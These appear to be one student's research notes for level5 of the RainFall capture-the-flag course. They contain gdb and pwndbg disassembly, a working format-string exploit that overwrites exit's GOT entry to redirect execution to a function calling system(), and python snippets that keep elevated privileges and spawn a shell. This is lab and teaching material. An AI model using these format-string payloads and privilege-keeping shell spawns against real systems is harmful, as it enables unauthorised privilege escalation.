# Research notes

This is the working log, including experiments that did not succeed. The verified VM procedure is in `../walkthrough`. Addresses from local experiments may differ from the ISO VM.

```bash
level5@RainFall:~$ gdb ./level5
Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.

(gdb) disas n
Dump of assembler code for function n:
0x080484c2 <+0>:	push   ebp
0x080484c3 <+1>:	mov    ebp,esp
0x080484c5 <+3>:	sub    esp,0x218
0x080484cb <+9>:	mov    eax,ds:0x8049848
0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
0x080484dc <+26>:	lea    eax,[ebp-0x208]
0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
0x080484ea <+40>:	lea    eax,[ebp-0x208]
0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
0x080484f3 <+49>:	call   0x8048380 <printf@plt>
0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
```

```bash
(gdb) br *n+9
Breakpoint 2 at 0x80484cb
(gdb) run

Breakpoint 1, 0x080484cb in n ()
(gdb) p/d ( $ebp - 0x208 - $esp ) / 4
$5 = 4

(gdb) set args < <(echo -n 'BBBB'; printf '%.0s %%#010x' {1..6}; echo)
(gdb) del
(gdb) run
BBBB 0x00000200 0xb7fd0ac0 0xb7ff3890 0x42424242 0x30232520 0x20783031
[Inferior 1 (process 5951) exited with code 01]

(gdb) x/a o
0x80484a4 <o>:	0x83e58955

(gdb) p/d 0x80484a4
$2 = 134513828
(gdb) p/d 0x80484a4 - 4 -1
$3 = 134513823

(gdb) x/a &'exit@got.plt'
0x8049838 <exit@got.plt>:	0x80483d6 <exit@plt+6>

(gdb) tty /dev/null
(gdb) run

(gdb) call printf("%1$134513827x %1$n", 0x8049838)
$3 = 134513828

(gdb) x/a &'exit@got.plt'
0x8049838 <exit@got.plt>:	0x80484a4 <o>
(gdb) quit


(gdb) tty /dev/null
(gdb) set args < <(python -c 'import struct; \
  print struct.pack("<I", 0x8049838) + "%4$134513823x %4$n"') >/dev/null
(gdb) br *0x080484ff
Breakpoint 6 at 0x80484ff
(gdb) x/a &'exit@got.plt'
0x8049838 <exit@got.plt>:	0x80483d6 <exit@plt+6>
(gdb) run

Breakpoint 1, 0x080484ff in n ()
(gdb)  x/a &'exit@got.plt'
0x8049838 <exit@got.plt>:	0x80484a4 <o>
(gdb) c
[Inferior 1 (process 5965) exited with code 01]
(gdb) quit
```

```bash
set args < <(python2.7 -c 'import struct; \
  print struct.pack("<I",0x8049838) + "%4$134513823x %4$n"') | tr -d ' '
```


```bash
set args < <(python -c 'import struct; \
  print struct.pack("<I", 0x8049838) + \
  "%4$134513823x %4$n"') >/dev/null

br n
br o
run
x/a &'exit@got.plt'
continue
x/a &'exit@got.plt'
```


```bash
pwndbg> mt i sec .text
Exec file: `/home/abelov/git/c/42london/RainFall/level5/level5', file type elf32-i386.
 [12]     0x80483f0->0x80485cc at 0x000003f0: .text ALLOC LOAD READONLY CODE HAS_CONTENTS
```

```bash
pwndbg> pipe info functions | awk '$1 >= "0x080483f0" && $1 <= "0x080485cc"'
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  o
0x080484c2  n
0x08048504  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini

pwndbg> i addr o
Symbol "o" is at 0x80484a4 in a file compiled without debugging.
pwndbg> disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x18
   0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump.

```



```bash
pwndbg> i sym 0x80483d0
exit@plt in section .plt of /home/abelov/git/c/42london/RainFall/level5/level5

pwndbg> pipe mt pr ms -objfile /home/abelov/git/c/42london/RainFall/level5/level5 | grep exit
[ 3] S 0x8048390 _exit section .plt
[ 4] T 0x8048390 _exit@plt section .plt
[11] S 0x80483d0 exit section .plt
[12] T 0x80483d0 exit@plt section .plt
[40] ? 0x8049828 _exit@got.plt section .got.plt
[44] ? 0x8049838 exit@got.plt section .got.plt  exit@got[plt]

# &'exit@got.plt'     address of the slot, stable
# 'exit@got.plt'      contents of the slot, mutable

pwndbg> disas 'exit@got.plt'
Dump of assembler code for function exit@plt:
0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
0x080483d6 <+6>:	push   0x28
0x080483db <+11>:	jmp    0x8048370
End of assembler dump.
```


```bash
# my naive approach
(python -c 'import struct; \
  print struct.pack("<I", 0x8049838) + \
  "%4$134513823x %4$n"'; cat) | \
  ./level5 | tr -d ' '

python -c 'import os,pty;
u=os.geteuid(); os.setreuid(u,u);
pty.spawn("/bin/bash")'

# More refined solution

(python -c 'import struct;
print struct.pack("<I", 0x804983a) + \
      struct.pack("<I", 0x8049838) + \
      "%2044x" + "%4$hn" + \
      "%31904x" + "%5$hn"'; cat) | \
  ./level5 | dd bs=33957 skip=1 2>/dev/null

python -c '
import os, pwd, pty

u = os.geteuid()
g = os.getegid()
pw = pwd.getpwuid(u)

os.setreuid(u, u)
os.setregid(g, g)

os.environ["HOME"] = pw.pw_dir
os.environ["USER"] = pw.pw_name
os.environ["LOGNAME"] = pw.pw_name
os.environ["SHELL"] = pw.pw_shell
os.chdir(pw.pw_dir)

pty.spawn([pw.pw_shell, "-l"])'

# press `Ctrl+z`
old=$(stty -g); stty raw -echo; fg; stty "$old"

echo $TERM
reset

# Then use the level6 shell normally. When finished:
exit # followed by: <Ctrl+J><Ctrl+J>

# this is because the upstream terminal is raw,
# pressing normal `Enter` sends CR (0x0d),
# while the pipe-backed /bin/sh wants an actual newline (LF, 0x0a).
```
